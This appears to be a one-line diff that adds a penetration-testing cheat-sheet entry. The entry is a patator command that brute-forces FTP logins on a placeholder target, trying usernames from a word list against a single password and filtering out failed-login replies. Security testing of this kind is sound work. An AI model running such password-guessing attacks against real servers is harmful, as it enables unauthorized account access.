@@ -1,0 +1,1 @@
+patator.py ftp_login host=$TARGET user=FILE0 0=logins.txt password=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
